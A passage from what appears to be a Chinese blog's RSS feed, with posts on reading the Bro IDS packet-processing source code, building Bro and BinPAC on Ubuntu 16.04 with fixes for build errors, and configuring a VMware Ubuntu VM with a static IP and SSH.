&lt;h1 id="源代码阅读">源代码阅读&lt;/h1>
&lt;blockquote>
&lt;p>重点：关注于网络数据包的处理部分代码&lt;/p>
&lt;/blockquote>
&lt;h2 id="bro的网络数据包处理流程">Bro的网络数据包处理流程&lt;/h2>
&lt;h3 id="bro启动初始化函数maincc">Bro启动初始化函数main.cc&lt;/h3>
&lt;blockquote>
&lt;p>int main(int argc, char** argv) (main.cc)&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-06-09Bro-Main.png" alt="2018-06-09Bro-Main">&lt;/p>
&lt;p>在Bro的&lt;code>main.cc&lt;/code>文件里面的Main函数是Bro启动过程中的首先执行的函数，而在这个&lt;code>main&lt;/code>函数里面，和我们的数据包处理部分相关密切的函数是&lt;code>net_run()&lt;/code>函数，这个函数是一个一直循环的函数，一旦出来这个函数之后，后面差不多就结束了。接下来阅读该函数代码。&lt;/p>
&lt;h3 id="数据包处理的主要函数-net_run">数据包处理的主要函数： net_run()&lt;/h3>
&lt;blockquote>
&lt;p>net_run() (Net.cc)&lt;/p>
&lt;/blockquote>
&lt;pre>&lt;code class="language-cpp">void net_run()
{
set_processing_status(&amp;quot;RUNNING&amp;quot;, &amp;quot;net_run&amp;quot;);
while ( iosource_mgr-&amp;gt;Size() ||
(BifConst::exit_only_after_terminate &amp;amp;&amp;amp; ! terminating) )
{
double ts;
iosource::IOSource* src = iosource_mgr-&amp;gt;FindSoonest(&amp;amp;ts); //打开之后，获取所以的网卡或者文件的句柄
current_iosrc = src;
bool communication_enabled = using_communication;
if ( src ) //如果这个句柄不是空的话就进入Process()函数
src-&amp;gt;Process(); // which will call net_packet_dispatch()
else if ( reading_live &amp;amp;&amp;amp; ! pseudo_realtime)
{ // live but no source is currently active
double ct = current_time();
if ( ! net_is_processing_suspended() )
{
net_update_time(ct);
expire_timers();
usleep(1); // Just yield.
}
}
else if ( (have_pending_timers || communication_enabled) &amp;amp;&amp;amp;
! pseudo_realtime )
{
net_update_time(current_time());
expire_timers();
if ( ! communication_enabled )
usleep(100000);
else
usleep(1000);
mgr.Drain();
processing_start_time = 0.0; // = &amp;quot;we're not processing now&amp;quot;
current_dispatched = 0;
current_iosrc = 0;
extern void termination_signal();
if ( signal_val == SIGTERM || signal_val == SIGINT )
termination_signal();
if ( ! reading_traces )
have_pending_timers = timer_mgr-&amp;gt;Size() &amp;gt; 0;
}
net_get_final_stats();
}
&lt;/code>&lt;/pre>
&lt;p>这个函数并不是很长，仔细阅读，我们可以发现我们只需要关注函数&lt;code>src-&amp;gt;Process&lt;/code>, 其中&lt;code>src&lt;/code>是&lt;code>iosource::IOSource* src = iosource_mgr-&amp;gt;FindSoonest(&amp;amp;ts);&lt;/code>相当于就是打开文件或者网卡数据的句柄（文件句柄或者网卡的句柄）。所以它的处理函数也就是我们想要的数据处理过程了。&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-06-09-Bro_net_run.png" alt="2018-06-09-Bro_net_run">&lt;/p>
&lt;p>接下来看&lt;code>Process&lt;/code>函数,在这个函数中我们可以看到它处理了Packet，处理完之后，调用了一个&lt;code>DoneWithPacket()&lt;/code>函数，但我们重点是关注的处理过程，所以我们需要关注函数&lt;code>net_packet_dispatch(net_packet_dispatch(current_pseudo, &amp;amp;current_packet, this);)&lt;/code>,在这个函数中传入了当前数据包的指针。&lt;/p>
&lt;blockquote>
&lt;p>void Pktsrc::Process() (Pktsrc.cc)&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-06-09-src_process.png" alt="2018-06-09-src_process">&lt;/p>
&lt;p>接下来阅读&lt;code>net_packet_dispatch(current_pseudo, &amp;amp;current_packet, this);&lt;/code>的处理过程。这个函数是在&lt;code>net.cc&lt;/code>文件中，和&lt;code>net_run()&lt;/code>函数是在同一个文件中。&lt;/p>
&lt;blockquote>
&lt;p>void net_packet_dispatch(double t, const Packet* pkt, iosource::PktSrc* src_ps) (net.cc)&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-06-09-net_packet_dispatch.png" alt="2018-06-09-net_packet_dispatch">&lt;/p>
&lt;p>在&lt;code>net_packet_dispatch()&lt;/code>函数中，有一个特别重要的数据结构&lt;code>sessions&lt;/code>,这是在&lt;code>sessions.cc&lt;/code>文件中定义的一个全局变量。&lt;br>
&lt;code>NetSessions* sessions;&lt;/code>&lt;br>
在这里我们需要阅读一下结构体&lt;code>NetSessions&lt;/code>,这个结构体是在&lt;code>sessions.h&lt;/code>文件中定义的。在这个结构体中有一个特别重要的函数&lt;code>NextPacket&lt;/code>,这个函数也是在&lt;code>net_packet_dispatch&lt;/code>中被调用的最重要的函数。&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-06-09-NetSessions_class.png" alt="2018-06-09-NetSessions_class">&lt;/p>
&lt;p>接下来阅读关键函数：&lt;code>NextPacket&lt;/code>&lt;/p>
&lt;blockquote>
&lt;p>void NetSessions::NextPacket(double t, const Packet* pkt) (sessions.cc)&lt;/p>
&lt;/blockquote>
&lt;pre>&lt;code class="language-cpp">void NetSessions::NextPacket(double t, const Packet* pkt) //t可能是时间戳
{
SegmentProfiler(segment_logger, &amp;quot;dispatching-packet&amp;quot;);
.....
if ( pkt-&amp;gt;hdr_size &amp;gt; pkt-&amp;gt;cap_len ) //开始判断包的大小问题
{
Weird(&amp;quot;truncated_link_frame&amp;quot;, pkt);
return;
}
uint32 caplen = pkt-&amp;gt;cap_len - pkt-&amp;gt;hdr_size;
//cap_len抓到的数据包的大小， hdr_size --- IP头里面的显示长度
if ( pkt-&amp;gt;l3_proto == L3_IPV4 )
{
if ( caplen &amp;lt; sizeof(struct ip) )
{
Weird(&amp;quot;truncated_IP&amp;quot;, pkt);
return;
}
const struct ip* ip = (const struct ip*) (pkt-&amp;gt;data + pkt-&amp;gt;hdr_size);
IP_Hdr ip_hdr(ip, false);
DoNextPacket(t, pkt, &amp;amp;ip_hdr, 0);
}
else if ( pkt-&amp;gt;l3_proto == L3_IPV6 )
{
.....
DoNextPacket(t, pkt, &amp;amp;ip_hdr, 0);
}
else if ( pkt-&amp;gt;l3_proto == L3_ARP )
{
if ( arp_analyzer )
arp_analyzer-&amp;gt;NextPacket(t, pkt);
}
.......
if ( dump_this_packet &amp;amp;&amp;amp; ! record_all_packets )
DumpPacket(pkt);
}
&lt;/code>&lt;/pre>
&lt;p>经过分析，上述的代码中，最重要的是函数&lt;code>DoNextPacket(t, pkt, &amp;amp;ip_hdr, 0)&lt;/code>,把数据包传入，指向ip头的指针传入。这个函数可以说是我们要找的最重要的函数了，在这个函数中，完成了&lt;code>IP头&lt;/code>重组工作。&lt;/p>
&lt;blockquote>
&lt;p>void NetSessions::DoNextPacket(double t, const Packet* pkt, const IP_Hdr* ip_hdr,
const EncapsulationStack* encapsulation) (Sessions.cc)&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-06-09-DoNextPacket_Main.png" alt="2018-06-09-DoNextPacket_Main">
这个函数已经开始处理IP数据包了,在这个函数里面，最主要的部分是处理片段的部分工作：&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-06-09-DoNextPacket_fuction.png" alt="2018-06-09-DoNextPacket_fuction">&lt;/p>
&lt;p>再初始化&lt;code>f&lt;/code>之前，执行了：&lt;/p>
&lt;pre>&lt;code class="language-cpp"> if ( discarder &amp;amp;&amp;amp; discarder-&amp;gt;NextPacket(ip_hdr, len, caplen) )
return;
FragReassembler* f = 0;
if ( ip_hdr-&amp;gt;IsFragment() )
{
dump_this_packet = 1; // always record fragments
&lt;/code>&lt;/pre>
&lt;p>主要看一下&lt;code>NextPacket函数&lt;/code>的执行过程:
在这个函数中主要检查了IP数据包，判断是TCP还是UDP，然后处理IP嵌套的情况。&lt;/p>
&lt;pre>&lt;code class="language-cpp">
int Discarder::NextPacket(const IP_Hdr* ip, int len, int caplen)
{
int discard_packet = 0;
if ( check_ip )
{
val_list* args = new val_list;
args-&amp;gt;append(ip-&amp;gt;BuildPktHdrVal());
try
{
discard_packet = check_ip-&amp;gt;Call(args)-&amp;gt;AsBool();
}
catch ( InterpreterException&amp;amp; e )
{
discard_packet = false;
}
delete args;
if ( discard_packet )
return discard_packet;
}
int proto = ip-&amp;gt;NextProto();
if ( proto != IPPROTO_TCP &amp;amp;&amp;amp; proto != IPPROTO_UDP &amp;amp;&amp;amp;
proto != IPPROTO_ICMP )
// This is not a protocol we understand.
return 0;
// XXX shall we only check the first packet???
if ( ip-&amp;gt;IsFragment() )
// Never check any fragment.
return 0;
int ip_hdr_len = ip-&amp;gt;HdrLen();
len -= ip_hdr_len; // remove IP header
caplen -= ip_hdr_len;
int is_tcp = (proto == IPPROTO_TCP);
int is_udp = (proto == IPPROTO_UDP);
int min_hdr_len = is_tcp ?
sizeof(struct tcphdr) :
(is_udp ? sizeof(struct udphdr) : sizeof(struct icmp));
if ( len &amp;lt; min_hdr_len || caplen &amp;lt; min_hdr_len )
// we don't have a complete protocol header
return 0;
// Where the data starts - if this is a protocol we know about,
// this gets advanced past the transport header.
const u_char* data = ip-&amp;gt;Payload();
if ( is_tcp )
{
if ( check_tcp )
{
const struct tcphdr* tp = (const struct tcphdr*) data;
int th_len = tp-&amp;gt;th_off * 4;
val_list* args = new val_list;
args-&amp;gt;append(ip-&amp;gt;BuildPktHdrVal());
args-&amp;gt;append(BuildData(data, th_len, len, caplen));
try
{
discard_packet = check_tcp-&amp;gt;Call(args)-&amp;gt;AsBool();
}
catch ( InterpreterException&amp;amp; e )
{
discard_packet = false;
}
delete args;
}
}
else if ( is_udp )
{
if ( check_udp )
{
const struct udphdr* up = (const struct udphdr*) data;
int uh_len = sizeof (struct udphdr);
val_list* args = new val_list;
args-&amp;gt;append(ip-&amp;gt;BuildPktHdrVal());
args-&amp;gt;append(BuildData(data, uh_len, len, caplen));
try
{
discard_packet = check_udp-&amp;gt;Call(args)-&amp;gt;AsBool();
}
catch ( InterpreterException&amp;amp; e )
{
discard_packet = false;
}
delete args;
}
}
else
{
if ( check_icmp )
{
const struct icmp* ih = (const struct icmp*) data;
val_list* args = new val_list;
args-&amp;gt;append(ip-&amp;gt;BuildPktHdrVal());
try
{
discard_packet = check_icmp-&amp;gt;Call(args)-&amp;gt;AsBool();
}
catch ( InterpreterException&amp;amp; e )
{
discard_packet = false;
}
delete args;
}
}
return discard_packet;
}
&lt;/code>&lt;/pre>
&lt;p>在这里主要是关键是四个部分&lt;/p>
&lt;ul>
&lt;li>FragReassembler* f = 0; 定义片段重组标志位为0&lt;/li>
&lt;li>f = NextFragment(t, ip_hdr, pkt-&amp;gt;data + pkt-&amp;gt;hdr_size); 得到下一个片段的指针&lt;/li>
&lt;li>const IP_Hdr* ih = f-&amp;gt;ReassembledPkt();&lt;/li>
&lt;li>FragReassemblerTracker frt(this, f);&lt;/li>
&lt;/ul>
&lt;h3 id="详细分析donextpacket函数的处理过程">详细分析DoNextPacket函数的处理过程&lt;/h3>
&lt;h4 id="fragreassembler类结构解析">FragReassembler类结构解析&lt;/h4>
&lt;blockquote>
&lt;p>class FragReassembler (Frag.h)&lt;/p>
&lt;/blockquote>
&lt;p>需要看一下&lt;code>FragReassembler&lt;/code>这个类里面的成员变量以及相应的函数。在这个类当中，最重要的函数是&lt;code>ReassembledPkt&lt;/code>&lt;br>
&lt;img src="http://www.guozet.me/images/in-post/2018-06-09-class-FragReassembler.png" alt="2018-06-09-class-FragReassembler">&lt;/p>
&lt;h4 id="nextfragment函数处理过程">NextFragment函数处理过程&lt;/h4>
&lt;blockquote>
&lt;p>FragReassembler* NetSessions::NextFragment(double t, const IP_Hdr* ip,
const u_char* pkt) (sessions.cc)&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-06-09-FragReassembler-NextFragment.png" alt="2018-06-09-FragReassembler-NextFragment">&lt;/p>
&lt;p>在这个函数中，主要查找了fragment，如果没有下一个，就新建一个新的Fragment并添加到&lt;code>fragments&lt;/code>的结构体里面去。&lt;/p>
&lt;h4 id="reassembledpkt函数处理过程">ReassembledPkt函数处理过程&lt;/h4>
&lt;p>这个函数的处理过程只有一条。&lt;/p>
&lt;blockquote>
&lt;p>ReassembledPkt() (Frag.h)&lt;/p>
&lt;/blockquote>
&lt;p>&lt;code> const IP_Hdr* ReassembledPkt() { return reassembled_pkt; }&lt;/code>&lt;/p>
&lt;p>对应的&lt;code>IP_Hdr* reassembled_pkt;&lt;/code>,所以只是返回去了一个指针头&lt;/p>
&lt;h4 id="fragreassemblertracker-frtthis-f处理过程">FragReassemblerTracker frt(this, f)处理过程&lt;/h4>
&lt;h4 id="处理conn的过程">处理Conn的过程&lt;/h4>
&lt;p>在&lt;code>DoNextPacket&lt;/code>这个函数的最后，会去新建或者找到一个&lt;code>Conn&lt;/code>处理处理数据包。执行代码:&lt;/p>
&lt;blockquote>
&lt;p>DoNextPacket() (Sessions.cc)&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-06-09-DoNextPacket-new-conn.png" alt="2018-06-09-DoNextPacket-new-conn">&lt;/p>
&lt;p>在处理Conn这个部分的时候，检查是否有对应的&lt;code>connection&lt;/code>,根据hash值去查询&lt;code>HashKey* h = BuildConnIDHashKey(id);&lt;/code>,如果没有对应的&lt;code>Conn&lt;/code>，那么就去新建一个，新建完之后，插入到connect的链表中。如果已经有了对应的&lt;code>Conn&lt;/code>那就需要判断当前的&lt;code>conn&lt;/code>是不是不正确的数据以及有没有被复用。如果有的话，删除对应的&lt;code>conn&lt;/code>的Hash值。&lt;/p></description></item><item><title>Ubuntu 16.04安装bro和Binpac</title><link>http://www.guozet.me/post/Install-bro-Binpac/</link><pubDate>Thu, 24 May 2018 13:30:32 +0000</pubDate><guid>http://www.guozet.me/post/Install-bro-Binpac/</guid><description>&lt;h1 id="前言">前言&lt;/h1>
&lt;p>﻿Bro is a powerful network analysis framework that is much different from the typical IDS you may know.&lt;/p>
&lt;p>BinPAC is a high level language for describing protocol parsers and generates C++ code. It is currently maintained and distributed with the Bro Network Security Monitor distribution, however, the generated parsers may be used with other programs besides Bro.&lt;/p>
&lt;h1 id="软件安装">软件安装&lt;/h1>
&lt;h2 id="安装bro">安装Bro&lt;/h2>
&lt;h3 id="前期依赖包安装">前期依赖包安装&lt;/h3>
&lt;p>Bro requires the following libraries and tools to be installed before you begin:&lt;/p>
&lt;blockquote>
&lt;ul>
&lt;li>Libpcap (
&lt;a href="http://www.tcpdump.org/" target="_blank" rel="noopener">http://www.tcpdump.org&lt;/a>)&lt;/li>
&lt;li>OpenSSL libraries (
&lt;a href="http://www.openssl.org/" target="_blank" rel="noopener">http://www.openssl.org&lt;/a>)&lt;/li>
&lt;li>BIND8 library&lt;/li>
&lt;li>Libz&lt;/li>
&lt;li>Bash (for BroControl)&lt;/li>
&lt;li>Python 2.6 or greater (for BroControl)&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;p>To build Bro from source, the following additional dependencies are required:&lt;/p>
&lt;blockquote>
&lt;ul>
&lt;li>CMake 2.8 or greater (
&lt;a href="http://www.cmake.org/" target="_blank" rel="noopener">http://www.cmake.org&lt;/a>)&lt;/li>
&lt;li>Make&lt;/li>
&lt;li>C/C++ compiler with C++11 support (GCC 4.8+ or Clang 3.3+)&lt;/li>
&lt;li>SWIG (
&lt;a href="http://www.swig.org/" target="_blank" rel="noopener">http://www.swig.org&lt;/a>)&lt;/li>
&lt;li>Bison (GNU Parser Generator)&lt;/li>
&lt;li>Flex (Fast Lexical Analyzer)&lt;/li>
&lt;li>Libpcap headers (
&lt;a href="http://www.tcpdump.org/" target="_blank" rel="noopener">http://www.tcpdump.org&lt;/a>)&lt;/li>
&lt;li>OpenSSL headers (
&lt;a href="http://www.openssl.org/" target="_blank" rel="noopener">http://www.openssl.org&lt;/a>)&lt;/li>
&lt;li>zlib headers&lt;/li>
&lt;li>Python&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;p>To install the required dependencies, you can use:&lt;/p>
&lt;ul>
&lt;li>DEB/Debian-based Linux:&lt;/li>
&lt;/ul>
&lt;pre>&lt;code class="language-bash">sudo apt-get install cmake make gcc g++ flex bison libpcap-dev libssl-dev python-dev swig zlib1g-dev
&lt;/code>&lt;/pre>
&lt;h3 id="installing-from-source">Installing from Source&lt;/h3>
&lt;p>Bro releases are bundled into source packages for convenience and are available on the
&lt;a href="https://www.bro.org/download/index.html" target="_blank" rel="noopener">bro downloads page&lt;/a>.&lt;/p>
&lt;p>Alternatively, the latest Bro development version can be obtained through git repositories hosted at &lt;code>git.bro.org&lt;/code>. See their
&lt;a href="https://www.bro.org/development/howtos/process.html" target="_blank" rel="noopener">git development documentation&lt;/a>.&lt;/p>
&lt;pre>&lt;code class="language-sh">git clone --recursive git://git.bro.org/bro
cd bro
sudo su
./configure
make
make install
&lt;/code>&lt;/pre>
&lt;h3 id="配置环境变量">配置环境变量&lt;/h3>
&lt;p>&lt;code>export PATH=/usr/local/bro/bin:$PATH&lt;/code>&lt;/p>
&lt;blockquote>
&lt;p>注意：由于Export的方式，只是在本次登录sh的过程中有效果的，所以后续需要重新配置&lt;/p>
&lt;/blockquote>
&lt;h2 id="安装binpac">安装Binpac&lt;/h2>
&lt;h2 id="依赖包文件httpswwwbroorgsphinx-gitcomponentsbinpacreadmehtmlid7">
&lt;a href="https://www.bro.org/sphinx-git/components/binpac/README.html#id7" target="_blank" rel="noopener">依赖包文件&lt;/a>&lt;/h2>
&lt;p>BinPAC relies on the following libraries and tools, which need to be installed before you begin:&lt;/p>
&lt;blockquote>
&lt;ul>
&lt;li>
&lt;p>Flex (Fast Lexical Analyzer)
Flex is already installed on most systems, so with luck you can skip having to install it yourself.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Bison (GNU Parser Generator)&lt;/p>
&lt;p>Bison is also already installed on many system.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>CMake 2.6.3 or greater&lt;/p>
&lt;p>CMake is a cross-platform, open-source build system, typically not installed by default. See
&lt;a href="http://www.cmake.org/" target="_blank" rel="noopener">http://www.cmake.org&lt;/a> for more information regarding CMake and the installation steps below for how to use it to build this distribution. CMake generates native Makefiles that depend on GNU Make by default&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;h3 id="installing-from-source-1">Installing from Source&lt;/h3>
&lt;p>To build and install into &lt;code>/usr/local&lt;/code>:&lt;/p>
&lt;pre>&lt;code>git clone --recursive git@github.com:bro/binpac.git
cd binpac
./configure
cd build
make
sudo make install
&lt;/code>&lt;/pre>
&lt;p>This will perform an out-of-source build into the build directory using the default build options and then install the binpac binary into &lt;code>/usr/local/bin&lt;/code>.&lt;/p>
&lt;p>You can specify a different installation directory with:&lt;/p>
&lt;p>./configure &amp;ndash;prefix=&lt;dir>&lt;/p>
&lt;p>Run &lt;code>./configure --help&lt;/code> for more options.&lt;/p>
&lt;h2 id="下载-binpac-sample-analyzer">下载 BinPAC Sample Analyzer&lt;/h2>
&lt;p>这个是一个python脚本，能够按照bro的规则生成出Binpac需要书写的文件，生成出来之后，我们只需要填写这些文件就可以了。&lt;/p>
&lt;h2 id="installing-from-source-2">Installing from Source&lt;/h2>
&lt;p>从Github上面拷贝例子的文件下来
&lt;code>git clone https://github.com/grigorescu/binpac_quickstart&lt;/code>
Inside the binpac_quickstart directory, simply run:&lt;/p>
&lt;p>&lt;code>python start.py Sample &amp;quot;Sample Protocol&amp;quot; ../bro --tcp --buffered&lt;/code>&lt;/p>
&lt;p>This will generate all the necessary files for this sample analyzer. The ../bro argument here just points to the Bro source tree. Make sure to change it if yours lives in a different location. See the start.py —helpoptions for more explanation of the options.&lt;/p>
&lt;p>Bro should be able to compile the generated template code right away, but files may have some “TODO” comments in them to mark places that typically need to be changed depending on the specifics of the protocol analyzer you want to make.&lt;/p>
&lt;h1 id="遇到的问题">遇到的问题&lt;/h1>
&lt;h2 id="书写analyzer时候遇到的问题">书写Analyzer时候遇到的问题&lt;/h2>
&lt;h3 id="bro安装过程中遇到的错误">Bro安装过程中遇到的错误&lt;/h3>
&lt;h4 id="错误1-configure错误">错误1 ./configure错误&lt;/h4>
&lt;pre>&lt;code>bro# ./configure --with-pcap=/opt/pfring
Build Directory : build
Source Directory: /root/install/bro
CMake Error at CMakeLists.txt:7 (include):
include could not find load file:
cmake/CommonCMakeConfig.cmake
CMake Error at CMakeLists.txt:52 (include):
include could not find load file:
FindRequiredPackage
– Found sed: /bin/sed
CMake Error at CMakeLists.txt:64 (FindRequiredPackage):
Unknown CMake command &amp;quot;FindRequiredPackage&amp;quot;.
– Configuring incomplete, errors occurred!
See also &amp;quot;/root/install/bro/build/CMakeFiles/CMakeOutput.log&amp;quot;.
&lt;/code>&lt;/pre>
&lt;p>解决方案：
克隆的时候需要添加&amp;ndash;recursive参数，保证自己下载的子模块
&lt;code>git clone --recursive git://git.bro.org/bro&lt;/code>&lt;/p>
&lt;h3 id="编译自己书写的analyzer时候的问题">编译自己书写的Analyzer时候的问题&lt;/h3>
&lt;h4 id="错误1">错误1&lt;/h4>
&lt;pre>&lt;code> make[3]: Entering directory '/users/Guoze/00_Workbench/bro/build'
make[3]: *** No rule to make target '../src/binpac', needed by 'src/binpac-lib_pac.h'. Stop.
make[3]: Leaving directory '/users/Guoze/00_Workbench/bro/build'
CMakeFiles/Makefile2:946: recipe for target 'src/CMakeFiles/pac-binpac-lib.pac.dir/all' failed
make[2]: *** [src/CMakeFiles/pac-binpac-lib.pac.dir/all] Error 2
make[2]: Leaving directory '/users/Guoze/00_Workbench/bro/build'
Makefile:138: recipe for target 'all' failed
make[1]: *** [all] Error 2
make[1]: Leaving directory '/users/Guoze/00_Workbench/bro/build'
Makefile:15: recipe for target 'all' failed
make: *** [all] Error 2
&lt;/code>&lt;/pre>
&lt;p>解决方案：
这个错误很大可能性是你使用了在该文件目录下没有权限，加入sudo make&lt;/p>
&lt;h4 id="错误2">错误2&lt;/h4>
&lt;pre>&lt;code>[ 1%] Completed 'project_caf'
make[3]: Leaving directory '/users/Guoze/00_Workbench/bro/build'
[ 2%] Built target project_caf
make[2]: Leaving directory '/users/Guoze/00_Workbench/bro/build'
Makefile:138: recipe for target 'all' failed
make[1]: *** [all] Error 2
make[1]: Leaving directory '/users/Guoze/00_Workbench/bro/build'
Makefile:15: recipe for target 'all' failed
make: *** [all] Error 2
&lt;/code>&lt;/pre>
&lt;p>解决方案：
这个错误很大可能性是你使用了&lt;code>make -j 4&lt;/code>多核编译的方式导致的，取消多核编译，仅仅使用make&lt;/p></description></item><item><title>在VMware内构建一个外网可以访问的Ubuntu服务器</title><link>http://www.guozet.me/post/Set-a-Ubuntu-in-the-VM/</link><pubDate>Sat, 12 May 2018 01:30:32 +0000</pubDate><guid>http://www.guozet.me/post/Set-a-Ubuntu-in-the-VM/</guid><description>&lt;h1 id="前言">前言&lt;/h1>
&lt;p>每次使用学校Lab的时候，都会有在需要安装软件或者更新软件的时候，由于没有Root权限而导致自己需要重新想办法处理，或者换到VPS上去处理的情况发生。每当这个时候，都在考虑，是否可以在VM中构建一个自己在任何地方都可以访问的服务器？&lt;/p>
&lt;h1 id="解决方案">解决方案&lt;/h1>
&lt;h2 id="设置静态ip地址">设置静态IP地址&lt;/h2>
&lt;p>背景&lt;/p>
&lt;p>在虚拟机下运行操作系统，尤其是Linux系统已经是非常常见的做法。有时你想在虚拟机下搭建一个(模拟)服务器来供主机访问，比如搭建一个telnet/ssh。此时你会发现，每次启动虚拟机，VMWare为虚拟机系统分配一个动态IP，这样每次去连接虚拟机的telnet时很不方便。如果设成静态IP就好了。&lt;/p>
&lt;p>VMnet8和NAT&lt;/p>
&lt;p>如果你的虚拟机是以NAT方式连入互联网的话，那么虚拟机的IP地址非配，网关以及互联网访问权限均由VMWare提供的叫做VMnet8虚拟网卡所提供。所以一切和设置静态IP有关的设置都可以从这里找到。通VMnet8虚拟网卡，主机可以访问虚拟机的IP，虚拟机可以连入主机的互联网连接连入外网。&lt;/p>
&lt;p>确认VMnet8虚拟网卡已启用&lt;/p>
&lt;p>在默认情况下，VMWare Workstation已经启用VMnet8虚拟网卡，Windows 7下，通过进入 控制面板&amp;gt;网络和Internet&amp;gt;网络和共享中心&amp;gt;更改适配器设置 可以查看该虚拟网卡的状态。如图1-1所示。&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-05-20NATNetworkInformation.png" alt="2018-05-20 NAT network information">&lt;/p>
&lt;p>得到可用IP范围、网关和子网掩码&lt;/p>
&lt;p>在VMWare主界面，点击Edit&amp;gt;Virtual Network Editor菜单进入虚拟网卡参数设置界面（图1-2）。选择VMnet8条目，点击NAT Settings按钮后可以看到我们的VMWare Workstation为NAT连接的虚拟机设定的默认网关，此处为192.168.91.2，以及子网掩码，此处为255.255.255.0, 如图1-3所示。&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/getSomeIpaddressWhichYouCanUse.png" alt="Get some ipaddress which you can use">&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-05-20.png" alt="2018-05-20 ">
点击DHCP Settings按钮，可以看到VMnet8为虚拟机分配的可用的子网IP范围，如图1-4所示。&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-05-20%E5%8F%AF%E7%94%A8%E7%9A%84IP%E5%9C%B0%E5%9D%80%E8%8C%83%E5%9B%B4.png" alt="2018-05-20可用的IP地址范围">&lt;/p>
&lt;p>在这里，我们可以得到
OK，至此，所有我们需要的信息都已经获取到，这里汇总一下，&lt;/p>
&lt;ul>
&lt;li>
&lt;p>子网IP可用范围：192.168.91.128~192.168.91.254&lt;/p>
&lt;/li>
&lt;li>
&lt;p>子网掩码：255.255.255.0&lt;/p>
&lt;/li>
&lt;li>
&lt;p>网关: 192.168.91.2&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>下面开始进入Ubuntu虚拟机设置静态IP。&lt;/p>
&lt;p>Ubuntu设置IP得知&lt;/p>
&lt;ol>
&lt;li>启动虚拟机Ubuntu系统，打开终端，利用如下命令打开并编辑网络接口配置文件：&lt;/li>
&lt;/ol>
&lt;p>sudo vi /etc/network/interfaces
2. 编辑文件如下：&lt;/p>
&lt;p>复制代码
auto lo
iface lo inet loopback&lt;/p>
&lt;h1 id="assgin-static-ip-by-eric-on-26-sep-2012">Assgin static IP by eric on 26-SEP-2012&lt;/h1>
&lt;p>iface eth0 inet static
address 192.168.91.200 #change to your static IP
netmask 255.255.255.0 #change to your netmask
gateway 192.168.91.2 #change to your getway
#We must specify dns-nameserver here
#in order to get internet access from host
dns-nameservers 192.168.91.2
auto eth0
复制代码
说明&lt;/p>
&lt;p>address是你要分配给你虚拟机的静态IP地址，可以从刚才我们找到的可用的子网IP范围中随便选择一个放在此处。&lt;/p>
&lt;p>netmask是子网掩码&lt;/p>
&lt;p>gateway是网关&lt;/p>
&lt;p>注意：在相对较早的版本中，你需要设置/etc下的resolv.conf文件，并加入nameserver，这样才可以连接互联网。但在Ubuntu 12.04之后，已经不推荐这种方式了，因为无论你想该配置文件中设置什么值，重新启动之后都会被还原为初始状态。推荐的做法是直接在interfaces配置文件中加入dns-nameserver &amp;lt;网关IP&amp;gt;这一行。&lt;/p>
&lt;ol start="3">
&lt;li>重启ubuntu的网卡&lt;/li>
&lt;/ol>
&lt;p>sudo /etc/init.d/networking restart
4. ping测试互联网连通性&lt;/p>
&lt;p>ping
&lt;a href="https://www.baidu.com" target="_blank" rel="noopener">www.baidu.com&lt;/a>
如果ping有响应，那么恭喜你，你已经成功将虚拟机设置为静态IP，并且也已连入互联网。&lt;/p>
&lt;p>开启防火墙
ufw enable&lt;/p>
&lt;p>关闭防火墙
ufw disable&lt;/p>
&lt;p>如果虚拟机里能ping同本机，而本机却ping不通虚拟机，或者虚拟机不能ping通本机，可能有如下原因：&lt;/p>
&lt;p>一，如果是桥接模式，那么可能性1：虚拟机防火墙禁ping，请关闭虚拟机防火墙重试；可能性2：桥接设置的ip有冲突或者是虚拟机桥接服务不正常。&lt;/p>
&lt;p>二，如果是nat模式，那么可能性1：虚拟机防火墙禁ping，请关闭虚拟机防火墙重试；可能性2：本机上的vmnet8网卡被禁用了。可能性3：vbox的nat模式，vpc的共享模式，本来就这样的。&lt;/p>
&lt;p>三，如果主机同时装了visualbox和vm，也会导致其中一个虚拟机ping不通主机，因此使用vm或vb时，在主机上禁用另一个虚拟网卡即可。&lt;/p>
&lt;p>SSH分客户端openssh-client和openssh-server
如果你只是想登陆别的机器的SSH只需要安装openssh-client（ubuntu有默认安装，如果没有则sudo
apt-get install openssh-client），如果要使本机开放SSH服务就需要安装openssh-server
sudo apt-get install openssh-server
然后确认sshserver是否启动了：
ps -e |grep ssh
如果看到sshd那说明ssh-server已经启动了。
如果没有则可以这样启动：sudo /etc/init.d/ssh start 或者 service ssh start
ssh-server配置文件位于/etc/ssh/sshd_config，在这里可以定义SSH的服务端口，默认端口是22，你可以自己定义成其他端口号，如222。
然后重启SSH服务：
sudo
/etc/init.d/ssh stop
sudo /etc/init.d/ssh start
然后使用以下方式登陆SSH：
ssh
&lt;a href="mailto:username@192.168.1.112">username@192.168.1.112&lt;/a> username为192.168.1.112 机器上的用户，需要输入密码。&lt;/p>
&lt;p>在刚安装完ubuntu后，屏幕不能全屏显示，此时：&lt;/p>
&lt;p>1、安装VMware Tools&lt;/p>
&lt;p>步骤：&lt;/p>
&lt;pre>&lt;code>1.1 进入ubuntu系统后，点击虚拟机上的【虚拟机】-&amp;gt;【安装 vmware tools】，回到桌面回看到一个vmware tools的
